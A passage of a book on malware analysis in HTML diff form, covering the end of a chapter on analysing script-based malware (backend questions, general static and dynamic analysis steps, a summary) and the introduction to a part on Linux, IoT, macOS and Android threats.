+				<li>What are the locations for the logs, the additional payloads delivered, and the stolen data?</li>
+				<li>Are there any statistics about affected users available?</li>
+				<li>Are there any logs that will reveal the malware writer’s identity? The SSH or RDP/custom RAT logs may help answer this question.</li>
+			</ul>
+			<p>More advanced steps include searching<a id="_idIndexMarker1626"/> for communication patterns that may help identify<a id="_idTextAnchor1173"/><a id="_idTextAnchor1174"/> future C&amp;Cs. If the HTTPS protocol was used, it may make sense to check where the corresponding certificate came from.</p>
+			<h2 id="_idParaDest-343"><a id="_idTextAnchor1175"/>Static and dynamic analysis</h2>
+			<p>Multiple programming<a id="_idIndexMarker1627"/> languages can be used to implement a backend. Whether it is PHP, Perl, Python, or something else, you need to correctly identify the programming language and check whether it is a ready framework. The first part of this task can be solved by looking at the corresponding file extensions. For the second part, the configuration files or directories will usually contain t<a id="_idTextAnchor1176"/>he name of the framework used.</p>
+			<p>Installing the corresponding IDE and loading th<a id="_idTextAnchor1177"/>e project there will drastically speed up further analysis as it will facilitate efficient static and dynamic analysis.</p>
+			<h1 id="_idParaDest-344"><a id="_idTextAnchor1178"/>Other script languages</h1>
+			<p>In this chapter, we covered the most common<a id="_idIndexMarker1628"/> examples of languages used nowadays. But what if you encounter something more exotic that you don’t have a ready step-by-step tutorial for? Or what if a new script language becomes incr<a id="_idTextAnchor1179"/>easingly popular, is available on lots of systems, and is, therefore, misused<a id="_idTextAnchor1180"/> by malicious actors? Don’t panic – we have summarized the ideas that will help you successfully analyze any new threat.</p>
+			<h2 id="_idParaDest-345"><a id="_idTextAnchor1181"/>Where to start</h2>
+			<p>Here is what you should<a id="_idIndexMarker1629"/> do when analyzing a new threat:</p>
+			<ol>
+				<li>Identify the language. There are multiple ways to do this, as follows:<ul><li>Look at the file extensions used</li><li>Use the <strong class="bold">file</strong> tool</li><li>Search for the header signature online</li><li>Check strings as they may give additional clues</li></ul></li>
+				<li>If the script requires some particular OS, make sure that you have a proper VM image set up.</li>
+			</ol>
+			<p>If the script language is compiled, search for tools such as decompilers or disassemblers to make static analysis possible.</p>
+			<ol>
+				<li value="1">If the code is not compiled and the source code has been obtained, check for the best IDE or syntax highlighter available. Use your preferred solution that supports debugging to make dynamic analysis more convenient.</li>
+				<li>Search for manuals on how to read the code – either the original or the one that comes with the help files for the corresponding tools. Additionally, check whether there are some APIs available.</li>
+				<li>If the code is obfuscated, try existing deobfuscators if there are any. It is always possible to use code beautifiers and name replacements to make the code more readable.</li>
+				<li>Check whether any dynamic analysis monitors or sandboxes are available that can log all critical functionality when the code is being executed.</li>
+				<li>Often, it is easier to review the output of dynamic analysis tools and then switch to static analysis so that you have some basic understanding of at least part of the functionality. Employ dy<a id="_idTextAnchor1182"/>namic analysis when you need to decrypt some important block of data or when you want to understand the l<a id="_idTextAnchor1183"/>ogic behind some piece of code.</li>
+			</ol>
+			<p>Once you<a id="_idIndexMarker1630"/> can analyze code, the next important step will be figuring out what to focus on.</p>
+			<h2 id="_idParaDest-346"><a id="_idTextAnchor1184"/>Questions to answer</h2>
+			<p>Reverse engineering<a id="_idIndexMarker1631"/> is not just an engineering task – often, it requires a certain amount of research and creativity to solve the corresponding challenges.</p>
+			<p>Usually, the analysis time is limited by circumstances. Therefore, pay particular attention to the functionality that will help answer the questions needed to complete the report. This part might be tricky because, without taking a look at everything, it is difficult to say whether the description is complete or not. Searching for the keywords of functions of interest<a id="_idIndexMarker1632"/> and checking their references should be a good starting point. After this, it makes sense to check whether any block of code was encrypted, encoded, or loaded externally. <a id="_idTextAnchor1185"/>Keeping your markup accurate will help you navigate the whole project and allow you to quickly come back later if necessary.</p>
+			<h1 id="_idParaDest-347"><a id="_idTextAnchor1186"/>Summary</h1>
+			<p>In this chapter, we covered multiple script languages and document macros that are often misused by attackers. We described the motivation behind a malware writer’s decision when they are choosing a particular approach. Additionally, we explored ready-to-use recipes on how to solve particular challenges specific to each language and summarized what functionality to pay attention to. You also gained a good understanding of various tools that will drastically help speed up analysis.</p>
+			<p>Finally, we covered generic approaches on how to handle malicious code written in virtually any script language that you may encounter. We also discussed the sequence of actions to follow to analyze malicious code efficiently.</p>
+			<p>After completing this chapter, you can now successfully perform static and dynamic analyses of various scripts, bypass anti-reversing techniques, and understand the core functionality of malware.</p>
+			<p>In <a href="B18500_11.xhtml#_idTextAnchor1188"><em class="italic">Chapter 11</em></a>, <em class="italic">Dissecting Linux and IoT Malware</em>, we will explore threats that target various Linux-based and IoT systems, learn how to analyze them, and then learn how to extend some of the knowledge you have gained from this chapter.</p>
+		</div>
+		<div><div></div>
+		</div>
+	
+
+		<div><h1 id="_idParaDest-348"><a id="_idTextAnchor1187"/>Part 4 Looking into IoT and Other Platforms</h1>
+		</div>
+		<div><p>This section is mainly focused on non-Windows platforms that have increasingly become a target of malware attacks. By going through it, you will understand the basic concepts behind the threats facing other PC, mobile, and embedded systems and will learn multiple techniques for their analysis.</p>
+			<p>In this section are the following chapters:</p>
+			<ul>
+				<li><a href="B18500_11.xhtml#_idTextAnchor1188"><em class="italic">Chapter 11</em></a><em class="italic">, Dissecting Linux and IoT Malware</em></li>
+				<li><a href="B18500_12.xhtml#_idTextAnchor1327"><em class="italic">Chapter 12</em></a><em class="italic">, Introduction to macOS and iOS Threats</em></li>
+				<li><a href="B18500_13.xhtml#_idTextAnchor1503"><em class="italic">Chapter 13</em></a><em class="italic">, Analyzing Android Malware Samples</em></li>
+			</ul>
+		</div>
+		<div><div></div>
+		</div>
+		<div><div></div>
+		</div>
+	</body></html>
